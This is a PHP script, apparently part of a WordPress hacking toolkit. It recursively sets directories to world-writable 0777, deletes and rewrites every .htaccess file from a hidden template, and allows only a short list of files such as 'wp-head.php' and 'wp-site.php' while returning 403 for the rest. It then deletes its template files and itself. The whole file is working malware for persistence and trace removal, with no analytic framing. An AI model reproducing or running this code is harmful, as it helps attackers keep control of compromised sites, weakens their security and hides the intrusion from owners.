<?php
header('Content-Type: text/html;charset=utf-8');
error_reporting(E_ALL);

if( isset($_POST['message_type']) && !empty($_POST['message_type']) ){
    $message_type = $_POST['message_type'];
}else{
    $message_type = 'html';
}

$seclevel = "|wp-head.php|wp-site.php"; //二级文件名

$root = $_SERVER['DOCUMENT_ROOT'];
@chdir($root);

$arpath8 = array();
fi1($root);

function fi1($path)
{
    global $root, $arpath8;
    
    if ($handle = opendir($path)) {
        while (($file = readdir($handle)) !== false) {
            
            if ($file != "." && $file != "..") {
                if (is_dir($path . "/" . $file) && ! is_link($path . '/' . $file)) {
                    $arpath8[] = $path . "/" . $file;
                    fi1($path . "/" . $file);
                }
            }
        }
    }
}

function output_message($result, $message_type='html', $html_tag='li'){
    
    if($message_type != 'html'){
        echo json_encode($result);
        return;
    }
    
    if( !is_array($result)){
        return;
    }
    
    if(!isset($result['title'])){
        $result['title'] = '';
    }
    
    echo '---------start '.$result['title'];
    
    if( sizeof($result['message']) > 0 ){
        foreach ( $result['message'] as $message){
            $message = str_replace('success', '<font color="blue">success</font>', $message);
            $message = str_replace(' ok', '<font color="blue"> ok</font>', $message);
            $message = str_replace('fail', '<font color="red">fail</font>', $message);
            echo "<$html_tag>" . $message . "</$html_tag>";
        }
    }
    
    if( isset($result['status']) && !empty($result['status'])){
        
        if( $result['status'] == 'ok'){
            $status = '<font color="green">'.$result['status'].'</font>';
        }
        
        if( $result['status'] == 'fail'){
            $status = '<font color="red">'.$result['status'].'</font>';
        }
        
        echo '---------end '.$result['title'].'===>status:'.$status;
        
    }else{
        
        $status = '<font color="green">ok</font>';
        
        echo '---------end '.$result['title'].'===>status:'.$status;
    }
    
    echo "<br />";
    
}
    
$return_data = array();
$return_data['title'] = '403';

if(file_exists('.hcontent') && file_exists('.hcontentold')){
    $contentorig = file_get_contents('.hcontent');
    $contentold = file_get_contents('.hcontentold');
    $htens = json_decode($contentold,true);

    if ( file_exists('.htaccess') && !is_writable('.htaccess') ) {
        $chmod_f_result = @chmod('.htaccess', 0644);
        if (!$chmod_f_result) {
            $return_data['message'][] = '.htaccess'.' permission denied';
        }
    }
    if( file_exists('.htaccess') ){
        unlink('.htaccess');
        $contentidx = str_replace('{#htens}','index.php|new.php|wp-login.php'.$seclevel,$contentorig);
        $fpc_result = file_put_contents('.htaccess', $contentidx);
           
        if(!$fpc_result){
            $return_data['message'][] = '.htaccess'.' fail';
        }

    }
   
    foreach ( $arpath8 as $a){
            if ( !is_writable($a) ) {
                
                $chmod_result = @chmod($a, 0777);
                
                if (!$chmod_result) {
                    $return_data['message'][] = $a.' permission denied';
                    continue;
                }
            }
            
            if ( file_exists($a.'/.htaccess') && !is_writable($a.'/.htaccess') ) {
                
                $chmod_f_result = @chmod($a.'/.htaccess', 0644);
                
                if (!$chmod_f_result) {
                    $return_data['message'][] = $a.'/.htaccess'.' permission denied';
                    continue;
                }
            }
            
            if( file_exists($a.'/.htaccess') ){
                unlink($a.'/.htaccess');
            }
			$b = str_replace($root."/", "", $a);
            if (isset($htens[$b]) && $htens[$b]!==""){
                if (substr($a, strpos($a, 'wp-admin')) === 'wp-admin'){
                    $content = str_replace('{#htens}','index.php|wp-login.php|profile.php|load-styles.php|load-scripts.php|plugins.php|plugin-install.php|'.$htens[$b].$seclevel,$contentorig);
                }else{
                    $content = str_replace('{#htens}',$htens[$b].$seclevel,$contentorig);
                }
            }else{
                if (substr($a, strpos($a, 'wp-admin')) === 'wp-admin'){
                    $content = str_replace('{#htens}','index.php|wp-login.php|profile.php|load-styles.php|load-scripts.php|plugins.php|plugin-install.php'.$seclevel,$contentorig);
                }else{
					$content = str_replace('{#htens}','',$contentorig);
				}
            }
            $fpc_result = file_put_contents($a.'/.htaccess', $content);
            
            if(!$fpc_result){
                $return_data['message'][] = $a.'/.htaccess'.' fail';
            }
        
        
    }
    
    $return_data['status'] = 'ok';
    $return_data['message'][] = '.htaccess 403 ok';
    output_message($return_data, $message_type);
    
    unlink('.hcontent');
    unlink('.hcontentold');
    
}else{
    
    $return_data['status'] = 'fail';
    $return_data['message'][] = '.hcontent file not exists';
    $return_data['message'][] = '.htaccess 403 fail';
    output_message($return_data, $message_type);
}

unlink(__FILE__);

?>

